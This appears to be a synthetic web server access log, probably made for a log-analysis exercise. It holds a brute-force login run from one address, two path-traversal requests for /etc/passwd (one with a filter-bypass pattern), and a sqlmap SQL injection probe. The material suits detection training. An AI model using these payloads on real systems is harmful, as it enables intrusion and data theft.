10.0.1.51 - - [26/Mar/2026:09:43:22 +0900] "GET / HTTP/1.1" 200 7245 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.51 - - [26/Mar/2026:09:34:07 +0900] "GET /css/style.css HTTP/1.1" 200 36905 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.12 - - [26/Mar/2026:12:53:13 +0900] "POST /api/status HTTP/1.1" 200 28356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.52 - - [26/Mar/2026:11:17:48 +0900] "POST /logout HTTP/1.1" 200 19866 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.2.100 - - [26/Mar/2026:13:42:59 +0900] "GET /index.html HTTP/1.1" 304 40947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
198.51.100.77 - - [26/Mar/2026:13:01:44 +0900] "POST /login HTTP/1.1" 401 306 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
198.51.100.77 - - [26/Mar/2026:13:00:52 +0900] "POST /login HTTP/1.1" 401 143 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.52 - - [26/Mar/2026:11:15:50 +0900] "GET /images/logo.png HTTP/1.1" 200 25136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.2.101 - - [26/Mar/2026:11:24:28 +0900] "GET /login HTTP/1.1" 200 45117 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
198.51.100.77 - - [26/Mar/2026:13:00:20 +0900] "POST /login HTTP/1.1" 401 411 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.50 - - [26/Mar/2026:13:20:25 +0900] "POST / HTTP/1.1" 304 44229 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.52 - - [26/Mar/2026:10:01:18 +0900] "GET /js/app.js HTTP/1.1" 200 35875 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.2.101 - - [26/Mar/2026:09:17:53 +0900] "GET /js/app.js HTTP/1.1" 200 23440 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.10 - - [26/Mar/2026:13:00:09 +0900] "GET / HTTP/1.1" 200 5999 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.100 - - [26/Mar/2026:09:49:14 +0900] "POST /dashboard HTTP/1.1" 200 28574 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.51 - - [26/Mar/2026:09:38:49 +0900] "POST /api/products HTTP/1.1" 200 7057 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.12 - - [26/Mar/2026:14:20:25 +0900] "GET /css/style.css HTTP/1.1" 200 28507 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.52 - - [26/Mar/2026:12:45:20 +0900] "GET /css/style.css HTTP/1.1" 200 9274 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.100 - - [26/Mar/2026:11:19:45 +0900] "POST /index.html HTTP/1.1" 200 8325 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.52 - - [26/Mar/2026:10:11:55 +0900] "POST /api/status HTTP/1.1" 200 13962 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.2.101 - - [26/Mar/2026:10:52:42 +0900] "POST /api/users HTTP/1.1" 304 34371 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
198.51.100.77 - - [26/Mar/2026:13:01:18 +0900] "POST /login HTTP/1.1" 401 354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.11 - - [26/Mar/2026:14:49:34 +0900] "POST /api/status HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.51 - - [26/Mar/2026:12:20:39 +0900] "GET /index.html HTTP/1.1" 200 47188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.2.101 - - [26/Mar/2026:13:26:34 +0900] "POST /logout HTTP/1.1" 200 22022 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.12 - - [26/Mar/2026:09:46:58 +0900] "POST /dashboard HTTP/1.1" 200 38714 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.12 - - [26/Mar/2026:12:28:18 +0900] "GET /profile HTTP/1.1" 200 44234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.11 - - [26/Mar/2026:09:29:06 +0900] "GET /about HTTP/1.1" 200 5764 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.10 - - [26/Mar/2026:11:32:44 +0900] "GET /login HTTP/1.1" 304 26786 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.51 - - [26/Mar/2026:12:19:51 +0900] "POST /logout HTTP/1.1" 200 14407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.11 - - [26/Mar/2026:10:29:43 +0900] "POST /about HTTP/1.1" 200 19368 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.101 - - [26/Mar/2026:14:56:48 +0900] "GET /dashboard HTTP/1.1" 200 28749 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.51 - - [26/Mar/2026:13:18:55 +0900] "POST /health HTTP/1.1" 200 40475 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.11 - - [26/Mar/2026:12:20:08 +0900] "POST /dashboard HTTP/1.1" 200 27987 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.11 - - [26/Mar/2026:10:57:19 +0900] "POST /about HTTP/1.1" 200 10480 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.100 - - [26/Mar/2026:13:21:46 +0900] "POST /about HTTP/1.1" 200 4868 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.10 - - [26/Mar/2026:10:26:24 +0900] "GET /js/app.js HTTP/1.1" 200 40287 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.52 - - [26/Mar/2026:13:03:11 +0900] "GET /index.html HTTP/1.1" 200 23716 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.11 - - [26/Mar/2026:11:07:43 +0900] "GET /about HTTP/1.1" 200 7236 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.51 - - [26/Mar/2026:14:39:31 +0900] "GET /js/app.js HTTP/1.1" 200 49236 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.11 - - [26/Mar/2026:11:43:34 +0900] "POST /logout HTTP/1.1" 200 11062 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.11 - - [26/Mar/2026:12:49:43 +0900] "GET /css/style.css HTTP/1.1" 200 46569 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
203.0.113.42 - - [26/Mar/2026:14:10:00 +0900] "GET /download?file=../../../etc/passwd HTTP/1.1" 403 203 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.50 - - [26/Mar/2026:09:46:49 +0900] "GET /api/users HTTP/1.1" 200 22104 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.100 - - [26/Mar/2026:11:26:43 +0900] "GET /js/app.js HTTP/1.1" 200 21936 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.12 - - [26/Mar/2026:11:11:25 +0900] "GET /about HTTP/1.1" 200 24401 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.101 - - [26/Mar/2026:13:19:45 +0900] "GET /js/app.js HTTP/1.1" 200 17830 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.52 - - [26/Mar/2026:11:18:03 +0900] "POST / HTTP/1.1" 200 30301 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.12 - - [26/Mar/2026:11:38:32 +0900] "POST / HTTP/1.1" 200 32879 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.11 - - [26/Mar/2026:09:23:56 +0900] "GET /css/style.css HTTP/1.1" 200 43280 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.2.100 - - [26/Mar/2026:10:00:55 +0900] "POST /health HTTP/1.1" 200 5466 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.51 - - [26/Mar/2026:09:49:49 +0900] "GET /css/style.css HTTP/1.1" 200 35389 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.52 - - [26/Mar/2026:13:34:53 +0900] "GET /images/logo.png HTTP/1.1" 200 32765 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.12 - - [26/Mar/2026:14:28:01 +0900] "GET /login HTTP/1.1" 200 9885 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.10 - - [26/Mar/2026:10:17:33 +0900] "POST /api/status HTTP/1.1" 200 29121 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
198.51.100.77 - - [26/Mar/2026:13:01:02 +0900] "POST /login HTTP/1.1" 401 114 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.2.100 - - [26/Mar/2026:12:57:43 +0900] "GET /index.html HTTP/1.1" 404 1485 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
198.51.100.77 - - [26/Mar/2026:13:01:06 +0900] "POST /login HTTP/1.1" 401 264 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.52 - - [26/Mar/2026:11:02:21 +0900] "GET / HTTP/1.1" 200 31580 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.51 - - [26/Mar/2026:14:22:15 +0900] "GET /images/logo.png HTTP/1.1" 200 7103 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.11 - - [26/Mar/2026:11:04:06 +0900] "GET /login HTTP/1.1" 200 27288 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.50 - - [26/Mar/2026:13:07:52 +0900] "GET /profile HTTP/1.1" 200 36665 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.10 - - [26/Mar/2026:13:44:51 +0900] "POST /dashboard HTTP/1.1" 304 35960 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
198.51.100.77 - - [26/Mar/2026:13:01:22 +0900] "POST /login HTTP/1.1" 401 421 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
198.51.100.77 - - [26/Mar/2026:13:03:14 +0900] "POST /login HTTP/1.1" 200 476 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.10 - - [26/Mar/2026:14:15:33 +0900] "POST /api/products HTTP/1.1" 200 4084 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.51 - - [26/Mar/2026:09:54:30 +0900] "POST /api/products HTTP/1.1" 200 16748 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.51 - - [26/Mar/2026:10:10:15 +0900] "POST /health HTTP/1.1" 200 4302 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.11 - - [26/Mar/2026:13:45:15 +0900] "GET /css/style.css HTTP/1.1" 200 15089 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.2.101 - - [26/Mar/2026:11:13:06 +0900] "GET /contact HTTP/1.1" 200 30260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.11 - - [26/Mar/2026:13:31:17 +0900] "POST /health HTTP/1.1" 200 6974 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.52 - - [26/Mar/2026:14:31:52 +0900] "GET /dashboard HTTP/1.1" 200 34519 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.12 - - [26/Mar/2026:10:32:53 +0900] "GET /css/style.css HTTP/1.1" 200 25743 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
203.0.113.42 - - [26/Mar/2026:14:09:00 +0900] "GET /include?page=....//....//etc/passwd HTTP/1.1" 403 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.11 - - [26/Mar/2026:12:00:22 +0900] "GET /js/app.js HTTP/1.1" 200 35519 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.51 - - [26/Mar/2026:09:19:19 +0900] "GET /index.html HTTP/1.1" 200 41923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.2.101 - - [26/Mar/2026:12:02:25 +0900] "POST /health HTTP/1.1" 200 40251 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
198.51.100.77 - - [26/Mar/2026:13:00:28 +0900] "POST /login HTTP/1.1" 401 489 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.52 - - [26/Mar/2026:14:43:02 +0900] "GET /js/app.js HTTP/1.1" 304 38381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
198.51.100.77 - - [26/Mar/2026:13:01:40 +0900] "POST /login HTTP/1.1" 401 206 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.51 - - [26/Mar/2026:10:40:31 +0900] "GET /api/users HTTP/1.1" 200 41458 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.2.101 - - [26/Mar/2026:09:06:21 +0900] "GET /logout HTTP/1.1" 200 33373 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.2.101 - - [26/Mar/2026:13:46:54 +0900] "GET /js/app.js HTTP/1.1" 200 42559 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.10 - - [26/Mar/2026:11:11:00 +0900] "POST /index.html HTTP/1.1" 200 25460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.10 - - [26/Mar/2026:09:10:47 +0900] "GET /js/app.js HTTP/1.1" 200 49386 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.10 - - [26/Mar/2026:10:48:24 +0900] "POST /about HTTP/1.1" 200 27695 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.51 - - [26/Mar/2026:10:42:03 +0900] "GET /js/app.js HTTP/1.1" 200 5766 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.12 - - [26/Mar/2026:12:11:40 +0900] "POST /api/status HTTP/1.1" 200 45063 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
198.51.100.77 - - [26/Mar/2026:13:00:56 +0900] "POST /login HTTP/1.1" 401 298 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.50 - - [26/Mar/2026:14:33:08 +0900] "GET /login HTTP/1.1" 200 45586 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.12 - - [26/Mar/2026:10:54:05 +0900] "GET /profile HTTP/1.1" 200 3356 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.12 - - [26/Mar/2026:11:24:29 +0900] "GET /login HTTP/1.1" 301 9182 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.2.101 - - [26/Mar/2026:10:48:41 +0900] "POST /logout HTTP/1.1" 200 26912 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
198.51.100.77 - - [26/Mar/2026:13:00:22 +0900] "POST /login HTTP/1.1" 401 171 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.101 - - [26/Mar/2026:13:08:05 +0900] "POST /index.html HTTP/1.1" 200 9423 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.2.100 - - [26/Mar/2026:09:37:48 +0900] "POST /dashboard HTTP/1.1" 200 10286 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.11 - - [26/Mar/2026:13:36:19 +0900] "GET / HTTP/1.1" 200 25379 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.100 - - [26/Mar/2026:09:06:30 +0900] "POST /about HTTP/1.1" 200 30824 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
198.51.100.77 - - [26/Mar/2026:11:03:00 +0900] "GET /search?q='%20OR%201=1%20-- HTTP/1.1" 500 2971 "-" "sqlmap/1.7.12#stable (https://sqlmap.org)"
10.0.1.50 - - [26/Mar/2026:09:16:40 +0900] "POST /api/products HTTP/1.1" 200 33995 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.50 - - [26/Mar/2026:14:16:51 +0900] "GET / HTTP/1.1" 200 1704 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.50 - - [26/Mar/2026:13:40:13 +0900] "POST /index.html HTTP/1.1" 301 30070 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.2.101 - - [26/Mar/2026:12:25:39 +0900] "POST /api/status HTTP/1.1" 304 16582 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.51 - - [26/Mar/2026:14:58:50 +0900] "GET /index.html HTTP/1.1" 304 30648 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.2.100 - - [26/Mar/2026:12:15:24 +0900] "POST /logout HTTP/1.1" 200 10786 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.2.100 - - [26/Mar/2026:14:34:12 +0900] "POST /api/status HTTP/1.1" 200 27979 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
198.51.100.77 - - [26/Mar/2026:13:02:50 +0900] "POST /login HTTP/1.1" 401 271 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.10 - - [26/Mar/2026:09:31:08 +0900] "POST /login HTTP/1.1" 301 27838 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.52 - - [26/Mar/2026:10:56:11 +0900] "POST /login HTTP/1.1" 404 45126 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.11 - - [26/Mar/2026:12:50:59 +0900] "GET /index.html HTTP/1.1" 404 36874 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.10 - - [26/Mar/2026:14:42:49 +0900] "GET /index.html HTTP/1.1" 200 41651 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.51 - - [26/Mar/2026:13:41:00 +0900] "POST /contact HTTP/1.1" 200 30035 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.10 - - [26/Mar/2026:12:01:55 +0900] "GET /profile HTTP/1.1" 200 17493 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.50 - - [26/Mar/2026:10:08:23 +0900] "POST /api/status HTTP/1.1" 200 45451 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.2.101 - - [26/Mar/2026:11:03:07 +0900] "POST / HTTP/1.1" 200 6976 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.2.101 - - [26/Mar/2026:12:50:12 +0900] "GET /index.html HTTP/1.1" 200 38370 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.101 - - [26/Mar/2026:10:14:24 +0900] "POST /health HTTP/1.1" 304 26345 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
198.51.100.77 - - [26/Mar/2026:13:01:14 +0900] "POST /login HTTP/1.1" 401 383 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.100 - - [26/Mar/2026:13:55:15 +0900] "POST /health HTTP/1.1" 200 23676 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.12 - - [26/Mar/2026:11:00:54 +0900] "POST /dashboard HTTP/1.1" 304 29345 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.52 - - [26/Mar/2026:09:21:11 +0900] "POST / HTTP/1.1" 404 48074 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.52 - - [26/Mar/2026:10:11:13 +0900] "GET /images/logo.png HTTP/1.1" 200 42154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
198.51.100.77 - - [26/Mar/2026:13:03:16 +0900] "POST /login HTTP/1.1" 200 443 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.51 - - [26/Mar/2026:12:41:13 +0900] "POST /about HTTP/1.1" 200 40424 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.50 - - [26/Mar/2026:10:54:11 +0900] "GET /css/style.css HTTP/1.1" 200 4558 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.100 - - [26/Mar/2026:11:47:53 +0900] "GET /api/products HTTP/1.1" 200 28521 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.50 - - [26/Mar/2026:10:23:17 +0900] "GET /contact HTTP/1.1" 200 43132 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
198.51.100.77 - - [26/Mar/2026:13:02:40 +0900] "POST /login HTTP/1.1" 401 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.52 - - [26/Mar/2026:14:04:15 +0900] "GET / HTTP/1.1" 200 44607 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.52 - - [26/Mar/2026:11:23:29 +0900] "GET /css/style.css HTTP/1.1" 301 31369 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.50 - - [26/Mar/2026:12:33:21 +0900] "POST /logout HTTP/1.1" 200 46384 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.10 - - [26/Mar/2026:09:43:30 +0900] "GET /contact HTTP/1.1" 200 41310 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
198.51.100.77 - - [26/Mar/2026:13:02:34 +0900] "POST /login HTTP/1.1" 401 411 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.52 - - [26/Mar/2026:14:01:43 +0900] "GET /js/app.js HTTP/1.1" 404 29981 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.2.100 - - [26/Mar/2026:14:02:41 +0900] "POST /contact HTTP/1.1" 200 23143 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.50 - - [26/Mar/2026:10:05:38 +0900] "GET /login HTTP/1.1" 200 12127 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.50 - - [26/Mar/2026:10:45:10 +0900] "POST /dashboard HTTP/1.1" 304 38320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.2.101 - - [26/Mar/2026:10:50:35 +0900] "GET /profile HTTP/1.1" 200 37193 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.2.100 - - [26/Mar/2026:12:27:50 +0900] "POST /api/status HTTP/1.1" 200 21075 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
